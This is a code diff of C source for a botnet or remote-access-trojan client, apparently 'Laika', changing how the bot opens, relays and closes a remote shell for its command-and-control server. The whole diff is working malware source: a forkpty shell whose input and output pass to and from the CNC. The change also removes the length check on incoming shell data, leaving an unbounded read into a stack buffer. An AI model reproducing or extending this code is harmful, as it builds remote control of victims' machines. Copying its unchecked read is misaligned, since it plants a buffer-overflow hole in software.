@@ -10,9 +10,8 @@
 #include "bot.h"
 #include "shell.h"
 
-struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int id) {
+struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot) {
     struct sLaika_shell *shell = (struct sLaika_shell*)laikaM_malloc(sizeof(struct sLaika_shell));
-    shell->id = id;
 
     shell->pid = forkpty(&shell->fd, NULL, NULL, NULL);
 
@@ -28,7 +27,7 @@ struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int id) {
         LAIKA_ERROR("Failed to set shell fd O_NONBLOCK");
     }
 
-    bot->shells[id] = shell;
+    bot->shell = shell;
     return shell;
 }
 
@@ -37,8 +36,7 @@ void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
     kill(shell->pid, SIGTERM);
     close(shell->fd);
 
-    bot->shells[shell->id] = NULL;
-
+    bot->shell = NULL;
     laikaM_free(shell);
 }
 
@@ -52,7 +50,6 @@ bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
     if (rd > 0) {
         /* we read some input! send to cnc */
         laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
-        laikaS_writeByte(sock, shell->id);
         laikaS_write(sock, readBuf, rd);
         laikaS_endVarPacket(peer);
     } else if (rd == -1) {
@@ -61,9 +58,7 @@ bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
         /* not EWOULD or EAGAIN, must be an error! so close the shell */
 
         /* tell cnc shell is closed */
-        laikaS_startOutPacket(peer, LAIKAPKT_SHELL_CLOSE);
-        laikaS_writeByte(sock, shell->id);
-        laikaS_endOutPacket(peer);
+        laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_CLOSE);
 
         /* kill shell */
         laikaB_freeShell(bot, shell);
@@ -87,9 +82,7 @@ bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *shell, char 
                 /* unrecoverable error */
 
                 /* tell cnc shell is closed */
-                laikaS_startOutPacket(peer, LAIKAPKT_SHELL_CLOSE);
-                laikaS_writeByte(sock, shell->id);
-                laikaS_endOutPacket(peer);
+                laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_CLOSE);
 
                 /* kill shell */
                 laikaB_freeShell(bot, shell);
@@ -107,46 +100,38 @@ bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *shell, char 
     return true;
 }
 
-/* ================================================[[ Handlers ]]================================================ */
+/* ============================================[[ Packet Handlers ]]============================================= */
 
 void laikaB_handleShellOpen(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     struct sLaika_bot *bot = (struct sLaika_bot*)uData;
-    uint8_t id = laikaS_readByte(&peer->sock);
 
-    /* check if shell id is in use */
-    if (id >= LAIKA_MAX_SHELLS || bot->shells[id])
-        LAIKA_ERROR("LAIKAPKT_SHELL_OPEN requested invalid id! [%d]\n", id);
+    /* check if shell is already open */
+    if (bot->shell)
+        LAIKA_ERROR("LAIKAPKT_SHELL_OPEN requested on already open shell!\n");
 
     /* open shell */
-    laikaB_newShell(bot, id);
+    laikaB_newShell(bot);
 }
 
 void laikaB_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     struct sLaika_bot *bot = (struct sLaika_bot*)uData;
-    uint8_t id = laikaS_readByte(&peer->sock);
 
-    /* check if shell id is in use */
-    if (id >= LAIKA_MAX_SHELLS || bot->shells[id] == NULL)
-        LAIKA_ERROR("LAIKAPKT_SHELL_CLOSE requested invalid id! [%d]\n", id);
+    /* check if shell is not running */
+    if (bot->shell == NULL)
+        LAIKA_ERROR("LAIKAPKT_SHELL_CLOSE requested on unopened shell!\n");
 
     /* close shell */
-    laikaB_freeShell(bot, bot->shells[id]);
+    laikaB_freeShell(bot, bot->shell);
 }
 
 void laikaB_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     char buf[LAIKA_SHELL_DATA_MAX_LENGTH];
     struct sLaika_bot *bot = (struct sLaika_bot*)uData;
-    struct sLaika_shell *shell;
-    uint8_t id;
+    struct sLaika_shell *shell = bot->shell;
 
-    if (sz <= 1 || sz > (LAIKA_SHELL_DATA_MAX_LENGTH + 1))
-        LAIKA_ERROR("malformed LAIKAPKT_SHELL_DATA!\n");
-
-    id = laikaS_readByte(&peer->sock);
-
-    /* sanity check id & validate shell */
-    if (id >= LAIKA_MAX_SHELLS || (shell = bot->shells[id]) == NULL)
-        LAIKA_ERROR("LAIKAPKT_SHELL_DATA sent invalid id! [%d]\n", id)
+    /* sanity check shell */
+    if (bot->shell == NULL)
+        LAIKA_ERROR("LAIKAPKT_SHELL_DATA requested on unopened shell!\n");
 
     /* read data buf */
     laikaS_read(&peer->sock, buf, sz - 1);
